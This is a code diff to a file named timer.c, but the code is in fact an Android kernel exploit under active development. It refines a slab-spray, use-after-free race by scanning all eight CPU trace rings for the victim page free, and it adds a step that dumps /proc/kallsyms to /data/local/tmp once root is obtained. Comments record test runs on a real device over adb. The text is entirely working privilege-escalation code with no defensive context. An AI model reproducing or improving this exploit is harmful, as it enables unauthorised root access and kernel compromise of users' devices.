@@ -1,0 +1,133 @@
+diff --git a/src/timer/timer.c b/src/timer/timer.c
+--- a/src/timer/timer.c
++++ b/src/timer/timer.c
+@@ -2138,8 +2138,8 @@
+ static int g_pool_n;
+ static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
+ static _Atomic int g_spray_tids[SPRAY_THREADS];
+-/* v4: pre-zombie free watcher (see free_watch_thread below). */
+-static _Atomic int g_pre_free, g_watch_live;
++/* v4/v5: pre-zombie free watcher (see free_watch_thread below). */
++static _Atomic int g_pre_free, g_watch_live, g_zombie_seen;
+ static unsigned long long g_watch_pfn;
+ 
+ struct spray_arg
+@@ -2272,19 +2272,33 @@
+         return NULL;
+     pin(g_cpu == 0 ? 1 : 0);
+     prctl(PR_SET_NAME, "yfreewatch", 0, 0, 0);
+-    while (!atomic_load(&g_pre_free) && !atomic_load(&g_stop_spray))
++    /*
++     * v5: scan ALL eight cpu rings -- PD2405 run 7 proved the victim free
++     * does not reliably land on the trigger cpu's ring (8/8 plants hit,
++     * zero watcher catches, and on 3 plants the event survived in some ring
++     * until the post-zombie scan, which a live cpu-2 watcher would have won).
++     * The watcher also exits at the zombie: past that point its consuming
++     * reads would eat the alloc events the parent's hit scan needs.
++     */
++    while (!atomic_load(&g_pre_free) && !atomic_load(&g_stop_spray) &&
++           !atomic_load(&g_zombie_seen))
+     {
+-        long m = read_fd(g_rawfd[g_cpu], buf, 1u << 20);
++        int cpu;
+ 
+-        if (m > 0 && scan_page_free(buf, (size_t)m, g_watch_pfn))
++        for (cpu = 0; cpu < 8 && !atomic_load(&g_pre_free); cpu++)
+         {
+-            atomic_store(&g_burst2, 1);
+-            atomic_store(&g_pre_free, 1);
+-            logf("[+] plant free watch: victim slab freed; "
+-                 "phase2 released at %ldms\n", now_ms() - t0);
+-            break;
++            long m = read_fd(g_rawfd[cpu], buf, 256u << 10);
++
++            if (m > 0 && scan_page_free(buf, (size_t)m, g_watch_pfn))
++            {
++                atomic_store(&g_burst2, 1);
++                atomic_store(&g_pre_free, 1);
++                logf("[+] plant free watch: victim slab freed on cpu%d; "
++                     "phase2 released at %ldms\n", cpu, now_ms() - t0);
++                break;
++            }
+         }
+-        usleep(100);
++        usleep(200);
+     }
+     free(buf);
+     return NULL;
+@@ -2531,9 +2545,16 @@
+      * wait_zombie(); the victim page free during exec is read within a few
+      * ms and phase 2 releases immediately instead of falling to the 150 ms
+      * fallback after the zombie.
++     *
++     * v5: the flush and the watcher both cover all eight cpus (run 7
++     * evidence: the free is not reliably on the trigger cpu ring), and a
++     * stale free of a previous plant's victim on ANY cpu must not trigger
++     * an early release.
+      */
+-    (void)read_fd(g_rawfd[g_cpu], raw, 32u << 20);
++    for (int cpu = 0; cpu < 8; cpu++)
++        (void)read_fd(g_rawfd[cpu], raw, 8u << 20);
+     atomic_store(&g_pre_free, 0);
++    atomic_store(&g_zombie_seen, 0);
+     g_watch_pfn = slab_pfn;
+     if (pthread_create(&wth, NULL, free_watch_thread, NULL) == 0)
+         atomic_store(&g_watch_live, 1);
+@@ -2559,6 +2580,7 @@
+         g_held++;
+         return;
+     }
++    atomic_store(&g_zombie_seen, 1);
+     logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
+          tag, T, etid, si.si_code, si.si_status);
+     if (si.si_code != CLD_KILLED)
+@@ -3054,6 +3076,49 @@
+         _exit(4);
+     }
+ 
++    /* v5: auto-harvest while root is live (PD2405 run 7 lost the window to
++     * terminal confusion -- the user typed into a fresh adb shell).  In
++     * zero-write mode the child keeps its shell SELinux context, so the
++     * kallsyms open may still be denied; the attempt is free and logged.
++     */
++    {
++        int kfd = open("/proc/kallsyms", O_RDONLY);
++        int ofd = open("/data/local/tmp/kallsyms-auto.txt",
++                       O_WRONLY | O_CREAT | O_TRUNC, 0644);
++
++        if (kfd >= 0 && ofd >= 0)
++        {
++            char hb[65536];
++            ssize_t kr;
++            long tot = 0;
++
++            while ((kr = read(kfd, hb, sizeof(hb))) > 0)
++            {
++                ssize_t off = 0;
++
++                while (off < kr)
++                {
++                    ssize_t wr2 = write(ofd, hb + off,
++                                        (size_t)(kr - off));
++
++                    if (wr2 <= 0)
++                        break;
++                    off += wr2;
++                }
++                tot += (long)kr;
++            }
++            logf("[+] auto-harvest: kallsyms %ld bytes -> "
++                 "/data/local/tmp/kallsyms-auto.txt\n", tot);
++        }
++        else
++            logf("[!] auto-harvest: open failed (kfd=%d ofd=%d errno=%d) "
++                 "-- use the interactive shell\n", kfd, ofd, errno);
++        if (kfd >= 0)
++            close(kfd);
++        if (ofd >= 0)
++            close(ofd);
++    }
++
+     {
+         char *const envp[] = {
+             (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
